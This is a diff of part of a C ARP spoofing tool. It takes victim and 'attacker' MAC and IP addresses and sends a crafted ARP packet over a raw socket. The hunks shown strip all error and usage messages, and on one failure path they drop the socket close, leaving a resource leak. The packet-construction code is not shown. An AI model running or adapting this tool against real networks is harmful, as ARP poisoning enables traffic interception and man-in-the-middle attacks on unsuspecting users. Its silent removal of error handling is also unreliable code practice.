@@ -22,10 +22,9 @@ int parse_mac(const char* str, unsigned char* bytes) {
     }
     return -1;
 }
-
+// Usage: <iface> <source IP> <source MAC> <dest IP> <dest MAC> <attacker MAC>
 int main(int argc, char *argv[]) {
     if (argc != 7) {
-        fprintf(stderr, "Usage: %s <iface> <source IP> <source MAC> <dest IP> <dest MAC> <attacker MAC>\n", argv[0]);
         return -1;
     }
 
@@ -40,27 +39,22 @@ int main(int argc, char *argv[]) {
     if (parse_mac(src_mac_str, src_mac) != 0 ||
         parse_mac(dst_mac_str, dst_mac) != 0 ||
         parse_mac(att_mac_str, att_mac) != 0) {
-        fprintf(stderr, "Invalid MAC address format\n");
         return -2;
     }
 
     struct in_addr src_ip, dst_ip;
     if (inet_pton(AF_INET, src_ip_str, &src_ip) != 1 ||
         inet_pton(AF_INET, dst_ip_str, &dst_ip) != 1) {
-        fprintf(stderr, "Invalid IP address\n");
         return -3;
     }
 
     int sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
     if (sock < 0) {
-        perror("socket");
         return -4;
     }
 
     int ifindex = if_nametoindex(iface);
     if (ifindex == 0) {
-        perror("if_nametoindex");
-        close(sock);
         return -5;
     }
 
@@ -98,7 +92,6 @@ int main(int argc, char *argv[]) {
     /* Send the packet */
     if (sendto(sock, buffer, sizeof(buffer), 0,
                (struct sockaddr*)&sa, sizeof(sa)) < 0) {
-        perror("sendto");
         close(sock);
         return -6;
     }
